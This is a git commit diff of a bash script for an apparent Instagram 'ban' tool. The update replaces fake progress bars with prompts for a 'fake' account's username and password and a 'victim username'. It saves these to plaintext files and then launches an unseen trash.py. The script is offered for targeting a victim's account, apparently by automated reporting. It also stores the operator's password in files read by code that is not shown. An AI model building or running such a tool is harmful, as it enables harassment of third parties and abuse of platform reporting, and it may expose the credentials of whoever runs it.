3c9861efd498a5eaef7b72cffd3f24bef1656b05
SHIBIL143 <103309836+SHIBIL143@users.noreply.github.com>
2024-03-20 23:11:35 +0530

    local.sh

--- local.sh
+++ local.sh
@@ -1,4 +1,3 @@
-#!/bin/bash
 
 clear
 for (( i=1; i<=100; i++ ));
@@ -8,25 +7,27 @@ sleep 0.01
 done
 sleep 1
 clear
-figlet S S
+figlet Insta Ban
 echo This Tool Created By SHIBILGAMER
 echo
-echo "Enter Victim Username without @"
-read name
+echo "Enter Currect Information else Not Work Ban Tool"
+echo
+echo "Enter Fake Instagram Username:"
+read user
+echo "Enter Password:"
+read pass
+echo "Enter Victim Username"
+read vname
 for (( j=1; j<=100; j++ )); do
 echo -ne "searching username...$j%\r"
 sleep 0.05
 done
 sleep 1
 echo -e username searching succefull ✓
-echo username:@$name
-sleep 3
+echo username:$vname
 
-for (( i=1; i<=100; i++ )); do
-    echo -ne "Instagram Account Baning..$i%\r"
-    sleep 0.1  # Adjust sleep duration as needed
-done
+echo "$user" > "u.txt"
+echo "$pass" > "p.txt"
+echo "$vname" > "v.txt"
 sleep 1
-echo -e "\nban report sented succesfull ✓"
-sleep 3
-echo 'Wait 2 hours for instagram account baning '
+python trash.py
